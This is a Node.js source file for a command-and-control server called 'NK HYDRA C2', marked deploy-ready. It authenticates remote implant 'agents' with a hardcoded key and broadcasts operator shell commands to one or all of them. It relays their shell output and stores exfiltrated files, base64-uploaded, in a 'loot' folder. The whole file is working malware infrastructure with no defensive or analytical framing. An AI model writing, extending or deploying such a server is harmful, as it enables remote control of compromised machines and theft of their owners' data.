// NK HYDRA C2 SERVER v7.0 (SOCKET CONTROL)
// STATUS: DEPLOY_READY
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" }, 
    maxHttpBufferSize: 1e8,
    pingTimeout: 60000 
});

// --- SECURITY CONFIG ---
const PORT = process.env.PORT || 3000;
const NK_API_KEY = "nk-autonomy-secret-key-1533"; // MUST MATCH AGENT

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// DATA STORE
const LOOT_DIR = path.join(__dirname, 'loot');
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

let agents = new Map(); // socketId -> AgentData
let uiSockets = new Set(); 

function broadcastState() {
    const list = Array.from(agents.values());
    io.to('ui_room').emit('agents_list', list);
    io.to('ui_room').emit('server_status', { 
        status: 'ONLINE', 
        count: list.length, 
        uptime: process.uptime() 
    });
}

io.on('connection', (socket) => {
    // 1. AUTHENTICATION (Headers or Handshake)
    const clientKey = socket.handshake.auth.key || socket.handshake.headers['x-api-key'];
    const clientType = socket.handshake.query.type || 'unknown';

    console.log(`[CONNECTION] New socket: ${socket.id} | IP: ${socket.handshake.address} | Type: ${clientType}`);

    // 2. IDENTIFY HANDLER
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            // Validate Key
            if (clientKey !== NK_API_KEY && data.key !== NK_API_KEY) {
                console.log(`[SECURITY] REJECTED Agent ${data.id}. Invalid Key.`);
                socket.emit('cmd', { cmd: 'die', args: 'Auth Failed' });
                socket.disconnect();
                return;
            }

            const agentData = { 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now(),
                ip: socket.handshake.address.replace('::ffff:', '')
            };
            
            agents.set(socket.id, agentData);
            console.log(`[+] AGENT REGISTERED: ${data.id}`);
            
            // Notify UI
            io.to('ui_room').emit('agent_event', { type: 'SYSTEM', agentId: data.id, payload: 'AGENT ONLINE' });
            broadcastState();

        } else if (data.type === 'ui') {
            socket.join('ui_room');
            uiSockets.add(socket.id);
            console.log('[+] UI CONSOLE CONNECTED');
            broadcastState();
        }
    });

    // 3. UI COMMAND DISPATCH (SOCKET BRIDGE)
    socket.on('dispatch', (data) => {
        // Data: { target: 'agent_id' | 'all', cmd: 'whoami', args: [] }
        if (!uiSockets.has(socket.id)) return; // Only allow UI to dispatch

        console.log(`[CMD] UI -> ${data.target}: ${data.cmd}`);
        
        if (data.target === 'all') {
            io.emit('exec', { cmd: data.cmd, args: data.args });
        } else {
            // Find socket by agent ID
            const targetSocket = [...agents.entries()].find(([sid, ag]) => ag.id === data.target);
            if (targetSocket) {
                io.to(targetSocket[0]).emit('exec', { cmd: data.cmd, args: data.args });
            } else {
                socket.emit('agent_event', { type: 'ERROR', agentId: 'SERVER', payload: 'Target not found' });
            }
        }
    });

    // 4. AGENT RESPONSES
    socket.on('stream_log', (data) => {
        // Relay log from Agent to UI
        io.to('ui_room').emit('agent_event', { 
            type: 'SHELL_OUTPUT', 
            agentId: data.from, 
            payload: data.output 
        });
    });

    // 5. LOOT HANDLING
    socket.on('upload_file', (data) => {
        const safeName = path.basename(data.filename).replace(/[^a-z0-9.]/gi, '_');
        const filepath = path.join(LOOT_DIR, `${data.agentId}_${Date.now()}_${safeName}`);
        
        fs.writeFile(filepath, data.b64content, 'base64', (err) => {
            if (!err) {
                console.log(`[LOOT] Saved: ${filepath}`);
                io.to('ui_room').emit('agent_event', { type: 'LOOT_SAVED', agentId: data.agentId, payload: safeName });
            }
        });
    });

    socket.on('disconnect', () => {
        if (agents.has(socket.id)) {
            const ag = agents.get(socket.id);
            console.log(`[-] AGENT LOST: ${ag.id}`);
            agents.delete(socket.id);
            io.to('ui_room').emit('agent_event', { type: 'SYSTEM', agentId: ag.id, payload: 'DISCONNECTED' });
            broadcastState();
        }
        uiSockets.delete(socket.id);
    });
});

server.listen(PORT, () => {
    console.log(`==========================================`);
    console.log(`[NK HYDRA V7.0] C2 SERVER LISTENING ON ${PORT}`);
    console.log(`[AUTH KEY] ${NK_API_KEY}`);
    console.log(`==========================================`);
});
